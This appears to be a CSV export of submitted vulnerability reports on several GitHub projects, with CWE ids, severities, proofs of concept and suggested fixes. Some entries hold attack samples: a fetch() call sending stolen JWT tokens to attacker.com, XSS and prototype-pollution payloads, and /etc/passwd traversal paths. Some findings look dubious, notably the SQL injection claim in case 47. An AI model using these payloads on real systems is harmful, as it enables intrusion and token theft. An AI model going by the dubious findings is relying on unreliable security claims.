Case,ID,Repository,CWE,Severity,Submitted At,Approved At,Description
47,1745587089046,pha123661/Online-Food-Ordering-System/blob/main/app.py,CWE-89,High,2025-04-25T13:18:09.000Z,2025-04-27T19:05:56.000Z,"The SQL query in the /search-transactionRecord route improperly uses the variable UID inside subqueries without parameterization, leading to SQL injection risk.

POC:
An attacker can craft a malicious UID parameter containing SQL code to manipulate the query, e.g., sending UID = ""1 OR 1=1"" could cause the query to return all transaction records.

Root Cause:
At line 651 in app.py:

@app.route(""/search-transactionRecord"", methods=['POST'])
def search_transactionRecord():
    UID = request.form['UID']
    db = get_db()
    rst = db.cursor().execute(
        '''
        with Shop_Name(TID, S_name) as (
                select TID, S_name 
                from Transaction_Record left join Stores
                on T_Object = S_owner
            ),
            Subj_Name(TID, Subj_name) as (
                select TID, U_name as Subj_name
                from Transaction_Record, Users
                where T_Subject = UID
            ),
            Obj_Name(TID, Obj_name) as (
                select TID, U_name as Obj_name
                from Transaction_Record, Users
                where T_Object = UID
            )
        select TID, 
            case 
                when T_action = 2 then 'Recharge'
                when T_action = 1 then 'Recieve'
                when T_action = 0 then 'Payment'
            end as Action, 
            strftime('%Y/%m/%d %H:%M', T_time) as Time,
            case
                when T_action = 2 then Subj_name
                when T_action = 1 and is_refund = 0 then Obj_name
                when T_action = 1 and is_refund = 1 then S_name
                when T_action = 0 and is_refund = 0 then S_name
                when T_action = 0 and is_refund = 1 then Obj_name
            end as Trader,
            T_amount
        from Transaction_Record natural join Subj_Name natural join Obj_Name natural join Shop_Name
        where T_Subject = ?
        ''', (UID,)
    ).fetchall()
    transaction = [{'TID': TID, 'Action': Action, 'Time': Time, 'Trader': Trader, 'T_amount': T_amount}
                   for TID, Action, Time, Trader, T_amount in rst]
    table = {'tableRow': transaction}
    print(table['tableRow'])
    response = jsonify(table)
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.status_code = 200
    return response


The subqueries use UID directly inside SQL without parameterization, which is vulnerable.

Exploit Scenario:
An attacker submits a crafted UID value containing SQL code in the POST request to /search-transactionRecord. This can lead to unauthorized data exposure or manipulation.

Why it Happens:
The UID variable is interpolated in subqueries without parameter binding. SQLite does not automatically replace UID inside subqueries with the parameter value, causing the SQL engine to treat it as a column or literal, enabling injection.

Security Implications:
Data leakage of sensitive transaction records and potential unauthorized access or modification of data.

Suggested Fix:
1. Parameterized Queries in Subqueries:
The subqueries Subj_Name and Obj_Name were directly embedding UID in the WHERE clause, leading to SQL injection. By using parameterized queries in subqueries by joining Transaction_Record with Users on T_Subject = Users.UID and T_Object = Users.UID respectively and added WHERE Users.UID = ? with UID passed as a parameter.

2.Multiple Parameters:
Because the UID is now used multiple times in the overall query (once in each of the Subj_Name and Obj_Name CTEs, and once in the final WHERE clause), you must pass it as a parameter multiple times in the execute() method.

Fixed Code: 
@app.route(""/search-transactionRecord"", methods=['POST'])
def search_transactionRecord():
    UID = request.form['UID']
    db = get_db()
    rst = db.cursor().execute(
        '''
        WITH Shop_Name(TID, S_name) AS (
            SELECT TID, S_name
            FROM Transaction_Record LEFT JOIN Stores
            ON T_Object = S_owner
        ),
        Subj_Name(TID, Subj_name) AS (
            SELECT TID, U_name AS Subj_name
            FROM Transaction_Record
            INNER JOIN Users ON Transaction_Record.T_Subject = Users.UID
            WHERE Users.UID = ?
        ),
        Obj_Name(TID, Obj_name) AS (
            SELECT TID, U_name AS Obj_name
            FROM Transaction_Record
            INNER JOIN Users ON Transaction_Record.T_Object = Users.UID
            WHERE Users.UID = ?
        )
        SELECT TID,
            CASE
                WHEN T_action = 2 THEN 'Recharge'
                WHEN T_action = 1 THEN 'Recieve'
                WHEN T_action = 0 THEN 'Payment'
            END AS Action,
            strftime('%Y/%m/%d %H:%M', T_time) AS Time,
            CASE
                WHEN T_action = 2 THEN Subj_name
                WHEN T_action = 1 AND is_refund = 0 THEN Obj_name
                WHEN T_action = 1 AND is_refund = 1 THEN S_name
                WHEN T_action = 0 AND is_refund = 0 THEN S_name
                WHEN T_action = 0 AND is_refund = 1 THEN Obj_name
            END AS Trader,
            T_amount
        FROM Transaction_Record
        NATURAL JOIN Subj_Name
        NATURAL JOIN Obj_Name
        NATURAL JOIN Shop_Name
        WHERE T_Subject = ?
        ''', (UID, UID, UID)  # Pass UID as parameter to each subquery
    ).fetchall()
    transaction = [{'TID': TID, 'Action': Action, 'Time': Time, 'Trader': Trader, 'T_amount': T_amount}
                   for TID, Action, Time, Trader, T_amount in rst]
    table = {'tableRow': transaction}
    print(table['tableRow'])
    response = jsonify(table)
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.status_code = 200
    return response
"
48,1745587136470,https://github.com/frappe/erpnext/blob/develop/.github/helper/translation.py,CWE-23,Critical,2025-04-25T13:18:56.000Z,2025-04-26T12:01:31.000Z,"Vulnerability Type: CWE-23: Path Traversal
Proof of Concept:
with open(_file) as f:
Step-by-Step Explanation:
The above line of code attempts to open a file based on user input (_file), which is passed as a command-line argument. If an attacker provides a specially crafted file path containing directory traversal sequences (e.g., ../../etc/passwd or ..\\..\\windows\\system32), the open() function will open unintended files outside of the intended directory. This could lead to unauthorized access or modification of system files.
Severity:
High
The severity is high because the vulnerability could allow an attacker to access sensitive files on the system, potentially leading to further exploitation, such as unauthorized reading, modification, or deletion of critical files.
Root Cause:
The vulnerability arises from using unvalidated user input (the file paths) directly in the open() function. Without proper checks or sanitization, an attacker can manipulate the file path to include directory traversal sequences, allowing them to escape the intended directory and access system-critical files.
Exploit Scenario:
An attacker could provide a path like ../../../../etc/passwd or ..\\..\\..\\windows\\system32\\config\\sam as one of the command-line arguments. If this input is used without sanitization in the open() function, the attacker could read system files like /etc/passwd or Windows' system files, which could contain sensitive information such as user credentials.
This could also be used as a vector for more sophisticated attacks, such as reading configuration files to gain further insights into the system, or even modifying sensitive files.
Why It Happens:
This vulnerability happens because the code directly passes user-supplied file names to the open() function without performing any sanitization or validation of the file paths. Path traversal vulnerabilities are common when user input is not strictly validated or filtered for potentially dangerous characters like ../.


Security Implications:
Exploiting this vulnerability could allow an attacker to access or manipulate system files, leading to a breach of confidentiality or integrity. In the worst-case scenario, this could lead to full system compromise, data leakage, or loss of data, depending on the system's configuration and the files an attacker is able to access. The attacker could also use this information to escalate their privileges on the system.
Suggested Fix:
--- original_script.py
+++ fixed_script.py
@@ -1,7 +1,9
 import os
 import re
 import sys
 
-errors_encounter = 0
+errors_encounter = 0

+def is_valid_file_path(file_path):
+    # Check if the file path is within the allowed directory
+    base_dir = ""/allowed/directory""
+    abs_path = os.path.abspath(file_path)
+    return abs_path.startswith(base_dir)
 
 pattern = re.compile(
     r""_\(([\""']{,3})(?P<message>((?!\1).)*)\1(\s*,\s*context\s*=\s*([\""'])(?P<py_context>((?!\5).)*)\5)*(\s*,(\s*?.*?\n*?)*(,\s*([\""'])(?P<js_context>((?!\11).)*)\11)*)*\)""
 )
 words_pattern = re.compile(r""_{1,2}\([\""'`]{1,3}.*?[a-zA-Z]"")
 start_pattern = re.compile(r""_{1,2}\([f\""'`]{1,3}"")
 f_string_pattern = re.compile(r""_\(f[\""']"")
 starts_with_f_pattern = re.compile(r""_\(f"")

 # skip first argument
 files = sys.argv[1:]
 files_to_scan = [_file for _file in files if _file.endswith(("".py"", "".js""))]

 for _file in files_to_scan:
+    if not is_valid_file_path(_file):
+        print(f""Invalid file path: {_file}"")
+        continue
     with open(_file) as f:
         print(f""Checking: {_file}"")
         file_lines = f.readlines()
         for line_number, line in enumerate(file_lines, 1):
             if ""frappe-lint: disable-translate"" in line:
                 continue
•	Sanitizing Input: A function is_valid_file_path(file_path) is introduced to check if the provided file path starts with an allowed directory (in this case, /allowed/directory).
•	Validation Before Opening: Before opening any file, the script now verifies that the file path is valid using is_valid_file_path(_file). If the path is invalid, it skips that file and prints a message indicating the invalid file path.

"
49,1745587944418,https://github.com/IvanderKendrick/Restooo-Food-Ordering-System,CWE-20,Medium,2025-04-25T13:32:24.000Z,2025-04-27T19:33:28.000Z,"Explanation:
The function addToCart(id, qty) assumes that the id passed is always valid and within the range of the foods list. However, if an invalid id (e.g., 0 or greater than length of foods) is passed, it will raise an IndexError and crash the program.

POC:
Inputting an invalid food id such as 0 or 999999 when adding to cart will cause an unhandled exception leading to crashing the program or denial of service.

Root Cause:
Line 96 in main.py.

myCart.append(Cart(foods[id -1].name, foods[id -1].price, qty))

No boundary check on id.

Exploit Scenario:
A user or attacker can input an invalid menu number such as greater then the food quantity or negative entries to crash the program.

Why it Happens:
No validation is done on the id parameter before accessing the list as compared with the length of foods.

Security Implications:
Denial of service by crashing the program. The potential crash will lead to service interruptions.

Suggested Fix:
Add validation to ensure id is within valid range before accessing foods.

def addToCart(id, qty):
    if id < 1 or id > len(foods):
        raise ValueError(""Invalid food ID"")
    myCart.append(Cart(foods[id - 1].name, foods[id - 1].price, qty))

"
50,1745595914371,mihai288/food-order-system/blob/main/kitchen_app.py,CWE-20,Medium,2025-04-25T15:45:14.000Z,2025-04-27T19:49:03.000Z,"Explanation:
The provided Python Tkinter code handles order management by reading from and writing to text files based on user input. The code lacks input validation and proper file handling safeguards, which can lead to security issues such as arbitrary file manipulation, injection attacks, and data corruption.

POC:
Entering a specially crafted order string containing newline characters or path traversal sequences (e.g., ../../somefile) in the entry widget can cause unintended file writes or deletions.
For example, entering ../../etc/passwd and submitting an order could potentially write to or remove lines from system files if the application runs with sufficient privileges.

Root Cause:
Line 27-34 in kitchen_app.py (complete_order function): Writes user input directly to ""completed_orders.txt"" and removes matching lines from ""started_orders.txt"" without sanitization.

entered_order = entry.get()
with open(""completed_orders.txt"", ""a"") as f:
    f.write(entered_order + ""\n"")
...
if value_to_remove not in line:
    file.write(line)

Exploit Scenario:
An attacker or malicious user can input crafted strings to manipulate the file system, such as injecting newline characters to add extra lines, or path traversal sequences to affect files outside the intended directory. This can lead to data loss, unauthorized file modification, or denial of service by corrupting order files.

Why it Happens:
Lack of input validation or sanitization on user inputs before writing to or modifying files.
Direct use of user input in file operations without restricting or validating content.
No error handling around file I/O operations.
Use of global mutable state (entered_order) unnecessarily complicates control flow and state management.

Security Implications:
Arbitrary file write and deletion could lead to data corruption or loss.
Potential for path traversal attacks if file paths are dynamically constructed (less likely here but still a risk if code evolves).
Injection of malicious content into order files could affect downstream processing.

Suggested Fix:
Validate and sanitize all user inputs to allow only expected characters (e.g., alphanumeric, spaces).
Avoid using global variables for user input; pass parameters explicitly.
Add error handling for file operations.
Following is the patched function:

import re

def sanitize_order(order):
    # Allow only alphanumeric and basic punctuation, strip leading/trailing spaces
    sanitized = re.sub(r'[^a-zA-Z0-9\s.,-]', '', order).strip()
    return sanitized

def complete_order():
    order = entry.get()
    sanitized_order = sanitize_order(order)
    if not sanitized_order:
        print(""Invalid order input."")
        return

    try:
        with open(""completed_orders.txt"", ""a"") as f:
            f.write(sanitized_order + ""\n"")

        file_name = ""started_orders.txt""
        with open(file_name, ""r"") as file:
            lines = file.readlines()

        with open(file_name, ""w"") as file:
            for line in lines:
                if sanitized_order not in line:
                    file.write(line)
    except IOError as e:
        print(f""File operation failed: {e}"")

"
51,1745596201767,https://github.com/warlordthesaviour/Setezor,CWE-79,Medium,2025-04-27T14:20:35.000Z,2025-04-27T14:24:40.000Z,"Vulnerability Type:
CWE-79: Improper Neutralization of Input During Web Page Generation (Stored ‘Cross-site Scripting’)

Proof of Concept:
<img src=""x"" onerror=""alert(1);"" />
This HTML snippet contains an image tag with an invalid source (x) and an onerror attribute. When the browser fails to load the image, it triggers the onerror handler, executing JavaScript code. If an application stores and later renders this user input using innerHTML without sanitizing it, the script executes in the context of another user’s session, allowing an attacker to exploit the system by injecting malicious JavaScript.

Severity:
Medium— This vulnerability allows attackers to execute arbitrary scripts in the browser, steal sensitive data such as cookies, hijack sessions, or perform malicious actions on behalf of authenticated users.

Root Cause:
The root cause is the failure to properly sanitize or escape user-controlled input before rendering it into the DOM. When the application outputs unsanitized input using methods like innerHTML, it enables attackers to inject HTML or JavaScript code. This lack of input validation and output encoding opens the door for cross-site scripting attacks, which can be exploited remotely by anyone with access to user input fields.

Exploit Scenario:
An attacker submits the payload <img src=x onerror=alert(1)> through a comment form or input field. If the server stores and later renders that input in a user-accessible page using innerHTML, every time a user visits the page, their browser interprets and executes the JavaScript inside onerror, triggering an alert. A real attack would use a script to steal session tokens or perform other unauthorized actions.

Why It Happens:
This issue occurs because the application injects unescaped user input directly into the HTML structure of a webpage. Using methods such as element.innerHTML instead of safe alternatives like textContent allows attackers to manipulate the DOM and execute scripts. The lack of proper input validation and output encoding creates a vector for attackers to embed executable scripts within the application’s front end, leading to stored or reflected XSS.

Security Implications:
If this vulnerability is successfully exploited, an attacker can execute malicious scripts in the browser of any user who views the compromised content. This can lead to session hijacking, phishing, defacement of the web application, data exfiltration, and redirection to malicious sites. It can compromise user trust and lead to regulatory and reputational damage for the affected application or organization, especially if personal data is exposed.

Suggested Fix:
Here’s how to implement the sanitize() function to protect against XSS attacks by escaping special characters:
    function sanitize(string) {
      const map = {
          '&': '&amp;',
          '<': '&lt;',
          '>': '&gt;',
          '""': '&quot;',
          ""'"": '&#x27;',
          ""/"": '&#x2F;',
      };
Before :
<h5 style=""margin-bottom: 0; word-break: break-all"">${(comment.text)}</h5>

After Fix:
<h5 style=""margin-bottom: 0; word-break: break-all"">${sanitize(comment.text)}</h5>

Sanitize all user-generated input using a reliable sanitization function that escapes HTML characters like <, >, "", and '. Use textContent instead of innerHTML where possible to avoid HTML injection. If HTML rendering is necessary, utilize a client-side library like DOMPurify to safely clean the content before injecting it into the DOM. On the server side, validate and sanitize inputs rigorously before storing or displaying them."
52,1745600699261,gogs/gogs,CWE-20,Low,2025-04-25T17:04:59.000Z,2025-04-27T12:50:51.000Z,"Vulnerability Type: CWE-20: Improper Input Validation

Proof of Concept: 
In Gogs, when creating a new repository, user input for repository names is not strictly validated. It is possible to create a repository with names that conflict with reserved system names or cause issues in backup or URL routing logic.
For example, a repository named `.` or `..` or `/admin` may interfere with system operations or URL handlers in certain deployments.

OWASP Top 10 Category: A05:2021 – Security Misconfiguration

Severity: Low (Level 2)

Root Cause: The repository name field accepts arbitrary user input without verifying that the name does not conflict with reserved words, filesystem names, or path-sensitive elements.

Exploit Scenario: A user creates a repository named `..` or `con` (on Windows). This could lead to unintended behavior during clone, backup, or deployment operations, including failures or denial of access to other features.

Why It Happens: Gogs does not sanitize or reject certain invalid or dangerous repository names. This lack of validation can lead to filesystem-level or routing conflicts.

Security Implications: Although this does not directly result in unauthorized access or data leakage, it can cause service degradation, denial-of-service, or integration problems when repositories cannot be accessed or manipulated properly.

Suggested Fix: Add validation to the repository creation endpoint to prevent the use of reserved keywords, special characters, or patterns known to cause conflicts on various filesystems and platforms."
53,1745602090590,https://github.com/gazi-allie/studynotion/blob/main/src/components/LoginForm.js,CWE-79,Medium,2025-04-25T17:28:10.000Z,2025-04-27T12:52:26.000Z,"1. Vulnerability: Cross-Site Scripting (XSS)
How Attackers Can Exploit:
The toast.success() message does not sanitize the input, and if the code dynamically inserts user-provided data (e.g., email or password) into the toast message, an attacker could inject malicious JavaScript.

Example Attack: An attacker enters <script>alert('XSS')</script> as the email. When rendered, this executes arbitrary JavaScript in the user's browser.

Mitigation:
Use input sanitization and encoding before displaying user inputs.

Use libraries like DOMPurify to sanitize user-provided inputs.

Updated Code to Mitigate XSS:

import DOMPurify from 'dompurify';

function submitHandler(event) {
    event.preventDefault();

    // Sanitize inputs before using them
    const sanitizedEmail = DOMPurify.sanitize(FormData.email);

    // Authenticate and navigate
    setIsLoggedIn(true);
    toast.success(`Welcome ${sanitizedEmail}`); // Safe display
    navigate(""/Dashboard"");
}
Why the Vulnerability occurs in the system:
The Cross-Site Scripting (XSS) vulnerability occurs in applications due to improper handling or neutralization of user-supplied input, allowing malicious scripts to execute in the context of a user's browser. Here's a breakdown of why this vulnerability arises:

1. Lack of Input Sanitization
Cause: The application does not sanitize or escape user-provided inputs before rendering them in the HTML or DOM.

Example:

Edit
<div>User Name: <span id=""user"">${input}</span></div>
If a malicious user enters <script>alert('XSS')</script> as input, it gets rendered and executed directly in the browser.

2. Trusting User Inputs
Cause: The application assumes all inputs are safe and directly embeds them into HTML, attributes, or JavaScript.

Example: Dynamically setting an attribute value:

<img src=""${input}"">
An attacker could inject onerror=""alert('XSS')"" to execute a malicious script.

3. Output Context Mismanagement
Cause: User inputs are not properly escaped or encoded based on the output context (HTML, JavaScript, CSS, etc.).

Example: A string output in JavaScript context:

const message = ""${userInput}"";
alert(message);
If the user input is ""); alert('XSS');//, the attacker can inject and execute JavaScript.

CWE: CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
Severity: Medium

Reason: XSS can allow attackers to execute malicious scripts in the context of the user's browser, potentially stealing sensitive data, such as session tokens or personal information.

Impact: Data theft, account takeover, phishing.
"
54,1745602883501,https://github.com/TusharKukra/LMS-Library-Management-System,"CWE-121 ,CWE-120",Critical,2025-04-25T17:41:23.000Z,2025-04-27T10:31:05.000Z,"C++ Library Management System - Buffer Overflow Vulnerability

- Affected Components: 
  `book::createbook()` and `student::createstudent()` functions in `LMSCode.cpp`

---

Root Cause:
The program uses unsafe C-style input functions (`gets()` and `cin >>` into fixed-size character arrays) without bounds checking. These functions can write beyond the limits of allocated buffers, causing memory corruption.

For example:
```cpp
char bname[50];
gets(bname); // Vulnerable: no length restriction

char bno[6];
cin >> bno; // No input size restriction: buffer overflow possible
```

This results in stack corruption, potential instruction pointer overwrite, or adjacent variable modification.

---

Exploit Scenario:
1. Attacker runs the LMS program and selects ""Create Book"".
2. For Book Name, they input:
   ```
   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
   ```
   (a string over 70 characters long).
3. The `gets(bname)` call writes past the `bname[50]` boundary, overwriting adjacent variables such as `aname`, `bno`, or potentially control data.
4. This leads to undefined behavior, including potential control flow hijack or program crash.

In advanced exploitation environments (e.g., no stack canary, executable stack), this could allow arbitrary code execution.

---

Why It Happens:
- `gets()` does not perform bounds checking.
- `cin >>` used on `char[]` without `.getline()` allows input longer than the buffer.
- No input sanitization or validation is present.
- Use of unsafe legacy headers and functions (`<conio.h>`, `gets()`, `clrscr()`) encourages poor memory safety practices.

---

Security Implications:
- Denial of Service (DoS) via crash
- Data corruption
- Arbitrary code execution  in vulnerable environments
- Potential privilege escalation in shared/multi-user systems

---

Suggested Fix:

1. Replace `gets()` with `std::cin.getline()`:
   ```cpp
   std::cin.getline(bname, 50);
   ```

2. Sanitize `cin >>` inputs:
   ```cpp
   std::cin >> std::setw(6) >> bno; // Protect bno[6]
   ```

3. Avoid deprecated headers and use `#include <iostream>`, `#include <cstring>`, etc.

4. Enable compiler protections:
   - Stack canaries (`-fstack-protector`)
   - AddressSanitizer (`-fsanitize=address`)
   - Compiler warnings (`-Wall -Wextra -Werror`)

5. Use C++ string classes (`std::string`) for safe dynamic memory handling.

---
Proof of Concept (PoC):

```cpp
Book bk;
bk.createbook();
```

Input:
```
Book No: 12345
Book Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Author: (leave blank)
```

Result:
- Stack memory corruption
- Potential overwrite of adjacent data (e.g., function return address in vulnerable builds)
"
55,1745613157740,Laverna/laverna/blob/master/app/scripts/apps/encryption/appEncrypt.js,CWE-285,High,2025-04-25T20:32:37.000Z,2025-04-28T06:06:05.000Z,"Vulnerability Type: CWE-285: Improper Authorization
Proof of Concept:
Radio.once('Confirm', 'auth', function() {
    Radio.request('encrypt', 'delete:secureKey');
    window.location.reload();
});
1. The code listens for the `Confirm:auth` event on the global `Radio` event bus.
2. When triggered, it deletes the secureKey and reloads the page.
3. No authentication check is performed before executing this critical operation.
4. Any script in the application (including malicious ones) can trigger this event:
   Radio.trigger('Confirm', 'auth');
Severity:  4 – High
Root Cause: The application registers an event listener that performs a critical operation (deletion of encryption key material) without verifying whether the caller is authorized. This leaves key lifecycle control exposed to untrusted scripts running in the same runtime.
Exploit Scenario: A malicious plugin or injected script (via stored XSS or developer tool manipulation) calls `Radio.trigger('Confirm', 'auth')`, which causes the user’s encryption key to be deleted and the page to reload. This disrupts encrypted session functionality and can lead to user confusion or DoS conditions.
 Why It Happens: The event hook relies on a global message bus and assumes that only legitimate, internal UI actions will trigger the event. However, since `Radio` is globally accessible in the app, it introduces a security-critical design flaw by allowing unauthenticated triggers.
Security Implications: An attacker with any access to frontend JS context can forcibly delete secure session keys, causing encrypted notes to become temporarily inaccessible. It opens the door to denial-of-service attacks or social engineering loops (forcing users to re-authenticate repeatedly).
Suggested Fix: Add an authentication check inside the event handler using `Radio.request('encrypt', 'check:auth')` to verify that the user is authorized before deleting the secure key. This ensures that only authenticated actions can trigger sensitive state changes."
56,1745644822677,ilhamclive/doctor-appointment-frontend/blob/master/src/context/AuthContext.jsx,CWE-922,High,2025-04-27T15:33:29.000Z,2025-04-27T21:54:33.000Z,"This vulnerability occurs because sensitive authentication tokens (JWT) are stored in localStorage, which is accessible from any JavaScript running in the browser.
The root cause is insecure client-side storage of tokens without mitigating XSS risks.
If an attacker injects malicious JavaScript via an XSS vulnerability on any page, they can steal the token and impersonate the user.
This can lead to full account takeover, privilege escalation, or data exposure.


Vulnerability Location:
The JWT token is stored in localStorage:

Line 41: localStorage.setItem(""token"", state.token);

This is security-sensitive logic, and it's relevant across:

https://github.com/ilhamclive/doctor-appointment-frontend/blob/master/src/context/AuthContext.jsx

Any component that consumes token from localStorage
Potentially exposed pages via XSS


Short Description of the Vulnerability Cause:
The vulnerability arises from storing sensitive authentication data (specifically the JWT token and user details) directly in the browser’s localStorage within the AuthContext logic:

Line 40: localStorage.setItem(""token"", state.token);
Line 41: localStorage.setItem(""user"", JSON.stringify(state.user));

This exposes the token to any JavaScript running on the page. If an attacker is able to inject malicious scripts through a Cross-Site Scripting (XSS) vulnerability anywhere in the application, they can access localStorage and steal the token. This compromises the user’s session and can lead to account takeover, especially if the token is long-lived or grants admin-level access.


Proof of Concept: 
Short Description of How an Attacker Could Exploit the Vulnerability
An attacker could exploit this vulnerability by injecting malicious JavaScript into a page via a Cross-Site Scripting (XSS) vector—such as an unsanitized input field, comment box, or a URL parameter that reflects into the DOM. Once the script runs in the victim's browser, it can access the localStorage and exfiltrate the stored JWT token and user information like this:

fetch(""https://attacker.com/steal"", {
  method: ""POST"",
  body: JSON.stringify({
    token: localStorage.getItem(""token""),
    user: localStorage.getItem(""user"")
  })
});
 Short Description of the Potential Consequences if Exploited:
If this vulnerability is exploited, an attacker can steal a user's JWT token and impersonate them across the application without needing their credentials. This can lead to account takeover, allowing the attacker to view sensitive personal data, perform unauthorized actions on behalf of the user, or escalate privileges if the stolen token belongs to an admin.


Suggested Fix:
To resolve this vulnerability, avoid storing authentication tokens in localStorage, as it is accessible to any script running in the browser and vulnerable to XSS-based token theft. Instead, use HttpOnly, Secure cookies to store JWT tokens—these cookies are inaccessible to JavaScript and automatically included in requests to the server"
57,1745658445192,requirejs/requirejs,CWE-1321,Medium,2025-04-26T09:07:25.000Z,2025-04-27T13:38:26.000Z,"Vulnerability Type: CWE-1321: Improper Neutralization of Special Elements in Object Key Used in JavaScript Object Injection ('Prototype Pollution')

Proof of Concept: 
In the RequireJS library (requirejs/requirejs), functions such as config() and s.contexts._.configure() accept user-supplied objects. These inputs are merged into existing internal structures without validation of property names. An attacker can pass an object containing the key ""__proto__"", which is merged into Object.prototype, affecting all objects.
Example exploit:
requirejs.config(JSON.parse('{""__proto__"":{""polluted"":""yes""}}'));

OWASP Top 10 Category: A08:2021 – Software and Data Integrity Failures

Severity: Medium (Level 3)

Root Cause: The vulnerable merging behavior does not account for JavaScript prototype pollution vectors, such as `__proto__`, allowing global object manipulation.

Exploit Scenario: An attacker injects a crafted JSON object into the configuration API of RequireJS. When parsed and merged, this pollutes Object.prototype, potentially leading to application logic corruption or security control bypass.

Why It Happens: JavaScript’s dynamic nature allows changes to Object.prototype to affect all objects. RequireJS merges user-defined objects into internal structures without sanitizing keys like ""__proto__"".

Security Implications: Exploiting this vulnerability can result in DoS, logic corruption, or further exploitation if application logic relies on object properties that are now maliciously overridden.

Suggested Fix: Implement input validation and object sanitization to skip unsafe keys like ""__proto__"", ""constructor"", and ""prototype"" during merges. Reject or recursively sanitize user inputs before integrating into core configuration."
58,1745667698800,https://github.com/adrianhajdin/node_express_crud_api/,CWE-693,Medium,2025-04-26T12:54:23.000Z,2025-04-26T17:17:51.000Z,"Vulnerability Type: CWE-693 Protection Mechanism Failure - Missing HTTP Security Headers

Proof of Concept: In the index.js file-

import express from ""express"";
import bodyParser from ""body-parser"";

import usersRoutes from ""./routes/users.js"";

const app = express();
const PORT = 5000;

app.use(bodyParser.json());

app.use(""/people"", usersRoutes);
app.get(""/"", (req, res) => res.send(""Welcome to the Users API!""));
app.all(""*"", (req, res) =>res.send(""You've tried reaching a route that doesn't exist.""));

app.listen(PORT, () =>console.log(`Server running on port: http://localhost:${PORT}`));

Here it is clear that the Express app is initialized without applying helmet, a middleware that sets security-related HTTP headers like X-Frame-Options, X-Content-Type-Options, and Strict-Transport-Security.

This can be secured by adding the helmet middleware which will add the security headers in the response of the server. The secure code will now become-

import express from ""express"";
import bodyParser from ""body-parser"";
import helmet from ""helmet"";      //here we import helmet middleware

import usersRoutes from ""./routes/users.js"";

const app = express();
const PORT = 5000;

app.use(bodyParser.json());
app.use(helmet());                     //Here we use the helmet middleware so that it can add the security headers to the request

app.use(""/people"", usersRoutes);
app.get(""/"", (req, res) => res.send(""Welcome to the Users API!""));
app.all(""*"", (req, res) =>res.send(""You've tried reaching a route that doesn't exist.""));

app.listen(PORT, () =>console.log(`Server running on port: http://localhost:${PORT}`));

Severity: 3 (Medium)

Root Cause: The application does not apply the helmet middleware, leading to missing security headers in HTTP responses. Without these protections, the application leaves the browser and users vulnerable to common client-side exploits.

Exploit Scenario: An attacker could create a malicious website that frames the Users API (clickjacking attack) or tries to execute a reflected XSS attack through API responses. Since protections like X-Frame-Options and Content-Security-Policy are missing, the browser would not block these malicious activities.

Why It Happens: The developers initialized an Express server but did not add middleware to set security headers. As a result, the server responds to HTTP requests without any browser-level security directives enforced.

Security Implications: An attacker could frame the application in a malicious page (clickjacking), inject scripts into responses (XSS), trick browsers into executing unintended code, or exploit HTTP response sniffing vulnerabilities. This could lead to unauthorized actions, theft of session data, or defacement of the API's front-end if integrated.

Suggested Fix:
Install and apply the helmet middleware in the Express app. Add import helmet from 'helmet'; and call app.use(helmet()); early in the middleware chain to automatically add common secure HTTP headers to all responses."
59,1745671113830,https://github.com/adrianhajdin/node_express_crud_api,CWE-117,Low,2025-04-26T12:38:33.000Z,2025-04-26T17:33:24.000Z,"Vulnerability Type:
CWE-117: Improper Output Neutralization for Logs

Proof of Concept:
This line in index.js is logging the IP and port information. 

app.listen(PORT, () => console.log(`Server running on port: http://localhost:${PORT}`));

In production, this can unintentionally expose internal network structure or server information to attackers with access to logs.

Root Cause:
The application directly logs the listening server address and port without considering the environment (development vs production). This results in leaking system details that should be hidden in production environments.

Exploit Scenario:
An attacker who gains access to production logs could see internal IP addresses, exposed ports, or service bindings. These details can then be used to plan internal attacks or find open services.

Why It Happens? 
The server’s startup code always outputs detailed system information without checking the execution context (development vs production), failing to neutralize sensitive data in logs.

Security Implications
Leakage of server address and port in production logs could help attackers perform lateral movement, open port scanning, network footprinting, and internal infrastructure mapping.

Suggested Fix:
Control logging behavior based on environment variables. In production, log only general success messages without exposing sensitive details like server IPs or ports."
